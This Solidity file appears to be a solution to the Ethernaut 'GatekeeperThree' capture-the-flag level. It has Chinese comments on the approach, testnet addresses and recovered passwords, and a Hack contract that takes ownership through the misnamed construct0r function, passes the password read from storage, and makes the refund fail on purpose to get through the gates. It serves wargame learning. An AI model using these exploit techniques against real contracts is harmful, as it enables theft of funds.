// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * ********** GatekeeperThree **********
 * 1、解题思路
 * 1）gateone: construct0r 直接修改 owner
 * 2) gatetwo: getAllowance()
 * 3) gateThree:
 *      - address(this).balance > 0.001 ether 就是向合约发送代币
 *      - payable(owner).send(0.001 ether) == false 就是这个合约向 owner 发送 0.001 ether 时不能成功
 * 2、测试用例
 *  1） 地址
 *      - gate 地址： 0xB933777a8b6bfD63be68718067A65987A1dDB251
 *                0x7Ef19eA95F77FF42Ba9FA368f2573352850A4531
 *      - trick 地址(调用gate合约createTrick函数创建的)：0x8B6782C40ca9B44186A8F4E65326f4844A0BC7Cf
 *                0x27d1b8EF451d57A276a09cd07CD901c615cc645F
 *      - password: 0x000000000000000000000000000000000000000000000000000000006514dec8
 *                0x000000000000000000000000000000000000000000000000000000006514ee04
 *
 *  2) 部署 hack 合约的时候 msg.value = 0.0011 ether
 *
 */

contract Hack {
    GatekeeperThree public gate;

    constructor(address payable _gate) payable {
        gate = GatekeeperThree(_gate);
    }

    function pwn(uint _password) external {
        // gate 1 -> Become the owner by calling the construct0r
        gate.construct0r();
        // gate 2 -> provide the password
        gate.getAllowance(_password);
        // gate 3 -> transfer ether
        payable(address(gate)).transfer(0.0011 ether);
        // _gate.transfer(0.0011 ether);

        // enter
        gate.enter();

        selfdestruct(payable(msg.sender));
    }

    // gate 3 -> payable(owner).send(0.001 ether) == false
    receive() external payable {
        revert();
    }
}

contract SimpleTrick {
    GatekeeperThree public target;
    address public trick;
    uint private password = block.timestamp;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function checkPassword(uint _password) public returns (bool) {
        if (_password == password) {
            return true;
        }
        password = block.timestamp;
        return false;
    }

    function trickInit() public {
        // 初始化 trick 地址
        trick = address(this);
    }

    function trickyTrick() public {
        // 本合约地址是调用者，但又不是 trick
        if (address(this) == msg.sender && address(this) != trick) {
            target.getAllowance(password);
        }
    }
}

contract GatekeeperThree {
    address public owner;
    address public entrant;
    bool public allowEntrance;

    SimpleTrick public trick;

    // 可以设置 owner()
    function construct0r() public {
        owner = msg.sender;
    }

    modifier gateOne() {
        require(msg.sender == owner);
        require(tx.origin != owner);
        _;
    }

    modifier gateTwo() {
        require(allowEntrance == true);
        _;
    }

    modifier gateThree() {
        if (
            address(this).balance > 0.001 ether &&
            payable(owner).send(0.001 ether) == false
        ) {
            _;
        }
    }

    function getAllowance(uint _password) public {
        if (trick.checkPassword(_password)) {
            allowEntrance = true;
        }
    }

    function createTrick() public {
        trick = new SimpleTrick(payable(address(this)));
        trick.trickInit();
    }

    function enter() public gateOne gateTwo gateThree {
        entrant = tx.origin;
    }

    receive() external payable {}
}
